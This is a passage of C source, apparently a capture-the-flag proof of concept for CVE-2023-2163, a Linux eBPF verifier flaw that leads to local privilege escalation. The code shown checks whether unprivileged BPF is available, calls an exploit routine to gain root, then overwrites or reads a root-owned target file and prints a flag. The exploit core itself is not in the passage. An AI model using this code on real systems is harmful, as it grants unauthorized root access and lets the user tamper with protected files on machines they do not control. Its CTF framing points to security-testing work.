        poc_log("Running as root, BPF available");
        return 1;
    }
    int fd = open("/proc/sys/kernel/unprivileged_bpf_disabled", O_RDONLY);
    if (fd < 0) return -1;
    char buf[16] = {};
    ssize_t n = read(fd, buf, sizeof(buf) - 1);
    close(fd);
    if (n <= 0) return -1;
    int val = atoi(buf);
    poc_log("unprivileged_bpf_disabled=%d, euid=%d", val, euid);
    return (val >= 1) ? 0 : 1;
}

static int read_target_file(const char *path, char *buf, size_t len) {
    int fd = open(path, O_RDONLY);
    if (fd < 0) return -1;
    ssize_t n = read(fd, buf, len - 1);
    close(fd);
    if (n < 0) return -1;
    buf[n] = '\0';
    /* Strip trailing newlines */
    while (n > 0 && (buf[n-1] == '\n' || buf[n-1] == '\r'))
        buf[--n] = '\0';
    return (int)n;
}

static int mode_write_root_file(const poc_args_t *args) {
    char original[4096], after[4096];

    /* Step 1: Read original content */
    int n = read_target_file(args->root_file, original, sizeof(original));
    if (n > 0) {
        printf(CTF_READ_BEFORE "%s\n", original);
        poc_log("Read before: %s", original);
    } else {
        printf(CTF_READ_BEFORE "(unreadable)\n");
    }

    /* Step 2: Run exploit to gain root */
    printf(CTF_WRITE_ATTEMPT "%s (attempting...)\n", args->write_value);
    poc_log("Attempting privilege escalation...");

    exploit_context ctx = {0};
    ctx.map_size = 4;
    ctx.read_fd = -1;
    ctx.kernel_page_size = 0x1000;
    ctx.kernel_allocated_pages = 0;
    ctx.kernel_memory = NULL;

    if (run_exploit(&ctx) != 0) {
        poc_print_fail("BPF verifier exploit failed");
        return 0;
    }

    /* Step 3: Now we have root - write to target */
    if (getuid() == 0 || geteuid() == 0) {
        int fd = open(args->root_file, O_WRONLY | O_TRUNC);
        int saved_errno = errno;
        poc_log_syscall("open(target, O_WRONLY|O_TRUNC)", (long)fd, saved_errno);
        if (fd >= 0) {
            char wbuf[256];
            int wlen = snprintf(wbuf, sizeof(wbuf), "%s\n", args->write_value);
            ssize_t written = write(fd, wbuf, wlen);
            poc_log_syscall("write(target, ctf_value)", (long)written, errno);
            close(fd);
        }
    }

    /* Step 4: Read after */
    n = read_target_file(args->root_file, after, sizeof(after));
    if (n > 0) {
        printf(CTF_READ_AFTER "%s\n", after);
        poc_log("Read after: %s", after);

        if (strstr(after, args->write_value)) {
            poc_print_flag(args->write_value);
            return 0;
        }
    } else {
        printf(CTF_READ_AFTER "(unreadable)\n");
    }

    poc_print_fail("write verification failed");
    return 0;
}

static int mode_read_root_file(const poc_args_t *args) {
    poc_log("Attempting read_root_file via privilege escalation...");

    exploit_context ctx = {0};
    ctx.map_size = 4;
    ctx.read_fd = -1;
    ctx.kernel_page_size = 0x1000;
    ctx.kernel_allocated_pages = 0;
    ctx.kernel_memory = NULL;

    if (run_exploit(&ctx) != 0) {
        poc_print_fail("BPF verifier exploit failed");
        return 0;
    }

    /* Now we have root - read the target file */
    char buf[4096];
    int n = read_target_file(args->root_file, buf, sizeof(buf));
    if (n > 0) {
        poc_print_flag(buf);
    } else {
        poc_print_fail("could not read target file after escalation");
    }
    return 0;
}

/* ========================================================================
 * Main entry point
 * ======================================================================== */

int main(int argc, char *argv[]) {
    poc_args_t args = {0};
    if (poc_parse_args(argc, argv, &args) != 0) return 1;
    poc_log_init(args.log_file);

    poc_log("=== CVE-2023-2163 CTF PoC ===");
    poc_log("Vuln: eBPF verifier pruning logic error -> arbitrary kernel R/W -> LPE");
    poc_log("UID: %d  EUID: %d  GID: %d  PID: %d", getuid(), geteuid(), getgid(), getpid());

    /* Check BPF availability */
    int bpf_avail = check_bpf_available();
    if (bpf_avail == 0) {
        poc_log("BPF syscall not available for unprivileged users");
        poc_print_fail("BPF restricted: unprivileged_bpf_disabled>=1 and not root");
        poc_log_close();
        return 0;
    }

    int result = 0;
    if (!args.mode) {
        poc_print_fail("no mode specified");
    } else if (strcmp(args.mode, POC_MODE_WRITE) == 0) {
        result = mode_write_root_file(&args);
    } else if (strcmp(args.mode, POC_MODE_READ) == 0) {
        result = mode_read_root_file(&args);
    } else {
        poc_print_unsupported(args.mode, "only write_root_file and read_root_file supported");
    }

    poc_log_close();
    return result;
}
